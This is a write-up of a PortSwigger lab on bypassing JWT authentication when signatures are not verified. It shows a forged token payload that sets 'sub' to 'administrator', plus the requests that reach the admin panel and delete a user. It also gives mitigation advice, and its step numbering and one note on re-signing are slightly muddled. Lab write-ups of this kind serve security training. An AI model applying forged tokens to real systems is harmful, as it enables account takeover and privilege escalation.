# JWT authentication bypass via unverified signature

**Source:** [PortSwigger](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)  
**Category:** JWT  
**Difficulty:** Apprentice

## Objective
To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

## Vulnerability
This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

### Steps

1. Log in to your account and intercept the post-login request in Burp (Proxy → HTTP history). The request contains a JWT in the `session` cookie:
    ```text
    GET /my-account?id=wiener HTTP/2
    Host: [lab-host]
    Cookie: session=[JWT]
    ```

2. Decode the JWT (Base64URL). The token consists of three parts:
    - **Header:**
      ```json
      {
          "kid": "434b1b3f-2e7d-4805-8ff6-ef5a5c4a48c8",
          "alg": "RS256"
      }
      ```
    - **Payload:**
      ```json
      {
          "iss": "portswigger",
          "exp": 1789664335,
          "sub": "wiener"
      }
      ```
    - **Signature** - RSA signature.

    Conclusion: the application uses JWT for session handling, and the `sub` field specifies the username.

4. Modify the payload - change the `sub` field from `wiener` to `administrator`:
    ```json
    {
        "iss": "portswigger",
        "exp": 1789664335,
        "sub": "administrator"
    }
    ```
    and send a request to the admin panel with the modified token:
    
    ```text
    GET /admin HTTP/2
    [...]
    ```
    The response returns the admin panel with a user list - the bypass works.

7. Send the request to delete the user `carlos`:
    ```text
    GET /admin/delete?username=carlos HTTP/2
    [...]
    ```
    The response is `302 Found` - the user `carlos` has been deleted. Lab solved.

### Payload
```json
{
    "iss": "portswigger",
    "exp": 1789664335,
    "sub": "administrator"
}
```

### Shortcut
1. Log in and intercept the `session` JWT in Burp.
2. Decode the JWT and change `sub` to `administrator`.
3. Re-sign the token using the **JWT Editor** extension.
4. Send `GET /admin/delete?username=carlos` to delete Carlos.

## Impact
An attacker can forge a JWT with an arbitrary `sub` value and impersonate any user, including `administrator`. This leads to privilege escalation, access to the admin panel, and the ability to perform privileged actions such as deleting users.

## Mitigation
Verify the JWT signature on every request using the correct key and algorithm. Do not accept tokens signed with attacker-controlled or weak keys. Enforce a strict allowlist of accepted algorithms and reject `none` or algorithm confusion. Bind the token to the session and validate all claims (`iss`, `exp`, `sub`) server-side. Rotate and protect signing keys.

## Tools
- Burp Suite
- Repeater
- JWT Editor

## Notes
- The session is a JWT with `sub` identifying the user.
- The `sub` claim can be changed to `administrator`.
- Re-signing the token with a valid key bypasses integrity checks.
- The modified token grants access to `/admin`.